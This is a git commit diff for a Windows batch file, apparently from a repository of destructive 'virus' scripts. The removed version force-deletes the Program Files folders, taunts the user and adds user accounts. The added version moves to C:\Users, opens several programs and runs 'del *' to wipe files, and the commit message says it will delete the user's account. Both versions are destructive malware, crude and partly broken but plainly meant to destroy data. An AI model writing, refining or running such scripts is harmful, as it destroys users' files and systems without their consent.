7f9e7f80757965afb796b204f0a976347889367b
TimetodestroyVirtualMachines <134893505+TimetodestroyVirtualMachines@users.noreply.github.com>
2023-05-28 20:21:30 -0400

    A bat file that will delete the Users Account

--- A bat file that will delete your program files.bat
+++ A bat file that will delete your program files.bat
@@ -1,8 +1,9 @@
-@echo off
-:programfilesaredead
-del /f /q "C:\Program Files"
-del /f /q "C:\Program Files (x86)"
-echo Ha! I deleted all your progarm files! Continue.
-set /a _programfilesaredead+=1
-net user %_programfilesaredead+% /add
-goto virus
+cd C:\
+cd Users
+start notepad.exe
+start wmplayer.exe
+start calc.exe
+start cmd.exe
+start dxdiag.exe
+start C:\Users
+del *
